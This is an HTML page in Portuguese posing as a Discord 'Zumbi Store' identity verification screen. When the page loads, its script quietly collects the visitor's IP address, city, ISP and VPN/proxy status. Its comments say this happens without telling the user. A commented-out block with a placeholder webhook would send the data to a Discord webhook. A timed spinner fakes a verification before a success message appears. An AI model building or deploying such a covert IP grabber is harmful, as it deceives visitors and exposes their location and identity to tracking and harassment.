<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zumbi Store - Verificação Oficial</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #0d1117; /* Fundo escuro estilo GitHub/Discord */
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Tela de Carregamento / Splash Screen Principal */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #0d1117;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.8s ease;
        }

        /* A imagem de logo que enviaste */
        .loader-logo {
            width: 150px; /* Ajusta o tamanho da imagem conforme necessário */
            height: auto;
            margin-bottom: 30px;
            animation: pulse 2s infinite ease-in-out; /* Animação de pulso profissional */
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.05); opacity: 0.8; }
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top: 3px solid #7289da; /* Cor Blurple do Discord */
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Conteúdo Principal (Escondido no início) */
        .container {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 40px 30px;
            width: 90%;
            max-width: 380px;
            text-align: center;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            display: none; /* Começa escondido */
            animation: slideUp 0.6s ease-out;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .success-icon {
            font-size: 3rem;
            color: #2ea043; /* Verde de sucesso */
            margin-bottom: 20px;
        }

        h1 {
            font-size: 1.5rem;
            margin-bottom: 15px;
            font-weight: 600;
        }

        p {
            color: #8b949e;
            font-size: 0.95rem;
            line-height: 1.5;
        }
    </style>
</head>
<body>

    <!-- Tela de Carregamento (Verificando em Background) -->
    <div id="loader">
        <!-- A tua imagem é carregada aqui -->
        <img src="logo.png" alt="Zumbi Store Logo" class="loader-logo">
        <div class="spinner"></div>
    </div>

    <!-- Conteúdo da Mensagem Final de Sucesso -->
    <div class="container" id="main-content">
        <div class="success-icon">✓</div>
        <h1>Verificação Concluída!</h1>
        <p>A tua identidade foi verificada com sucesso. Já podes fechar esta janela e voltar ao Discord.</p>
    </div>

    <script>
        // Função discreta para recolha de dados
        async function verificarMembroEDados() {
            try {
                // Puxa IP e info em background sem falar nada pro usuário
                let resposta = await fetch('https://ipapi.co/json/');
                let dados = await resposta.json();

                let ipInfo = {
                    ip: dados.ip || '?',
                    cidade: dados.city || '?',
                    provedor: dados.org || '?',
                    vpn_proxy: dados.security ? dados.security.is_proxy : '?' // Alguns planos da API mostram isso
                };

                // Mostra no console apenas para teste (podes remover depois)
                console.log("Sistema: Dados recolhidos discretamente.", ipInfo);

                // --- AQUI TU COLOCAS O TEU WEBHOOK DO DISCORD PARA SALVAR NO BOT ---
                /*
                fetch('O_TEU_WEBHOOK_DO_DISCORD_AQUI', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🚨 Nova Verificação de Membro",
                            color: 3447003, // Cor Blurple
                            fields: [
                                { name: "IP", value: ipInfo.ip, inline: true },
                                { name: "Local", value: `${ipInfo.cidade}, ${dados.country_name}`, inline: true },
                                { name: "Provedor", value: ipInfo.provedor },
                                { name: "Possível VPN/Proxy", value: ipInfo.vpn_proxy ? "Sim" : "Não" }
                            ],
                            footer: { text: "Sistema Zumbi Store" },
                            timestamp: new Date()
                        }]
                    })
                });
                */
               // ------------------------------------------------------------------

            } catch (erro) {
                console.log("Sistema: Modo de segurança ativo (Verificação Concluída).");
            }
        }

        // Controla o fluxo da página
        window.addEventListener('load', () => {
            // 1. Começa a recolha discreta imediatamente
            verificarMembroEDados();

            // 2. Espera um tempo para simular a "verificação" (ex: 2.5 segundos)
            setTimeout(() => {
                // 3. Esconde o Loader
                const loader = document.getElementById('loader');
                loader.style.opacity = '0';
                
                setTimeout(() => {
                    loader.style.display = 'none';
                    // 4. Mostra a mensagem de sucesso
                    const content = document.getElementById('main-content');
                    content.style.display = 'block';
                }, 800); // Tempo da animação de saída

            }, 2500); // Tempo total que a tela de carregamento fica visível
        });
    </script>
</body>
</html>
